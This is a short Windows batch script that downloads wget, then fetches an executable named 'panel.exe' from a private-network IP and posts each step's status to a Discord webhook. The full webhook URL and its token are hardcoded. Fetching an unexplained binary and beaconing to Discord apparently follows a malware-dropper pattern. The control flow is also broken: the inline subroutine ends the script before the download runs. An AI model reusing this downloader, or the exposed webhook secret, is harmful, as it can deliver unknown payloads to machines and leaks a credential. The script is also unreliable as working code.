@echo off
setlocal

:: Define the URL for wget installer and the file to download
set "wget_url=https://eternallybored.org/misc/wget/1.21.3/64/wget.exe"
set "download_url=http://172.16.0.2:8080/serve/panel.exe"
set "wget_installer=wget.exe"
set "webhook_url=https://discord.com/api/webhooks/1259897177371709520/-itrwuHHr_-HuRi5bFY6c0YghzTfS4pFdzj_rKpiliIy3mSggRhTuu1zOBNhKIpjGJX0"

:: Check if curl is installed
where curl >nul 2>&1
if %errorlevel% neq 0 (
    echo curl is not installed. Please install curl to proceed.
    exit /b 1
)

:: Function to send feedback to Discord webhook
:send_feedback
setlocal
set "message=%~1"
set "json_payload={\"content\": \"%message%\"}"
curl -H "Content-Type: application/json" -X POST -d "%json_payload%" "%webhook_url%"
endlocal
goto :eof

:: Check if wget is installed
where wget >nul 2>&1
if %errorlevel% neq 0 (
    call :send_feedback "wget is not installed. Installing wget..."

    :: Download wget installer
    powershell -Command "Invoke-WebRequest -Uri '%wget_url%' -OutFile '%wget_installer%'"
    if %errorlevel% neq 0 (
        call :send_feedback "Failed to download wget installer. Exiting..."
        exit /b 1
    )

    :: Optionally, move wget to a directory in PATH or just use it from here
    call :send_feedback "wget has been downloaded. Using it now..."
)

:: Download the file using wget
wget %download_url%
if %errorlevel% neq 0 (
    call :send_feedback "Failed to download file. Exiting..."
    exit /b 1
)

call :send_feedback "File downloaded successfully."
endlocal
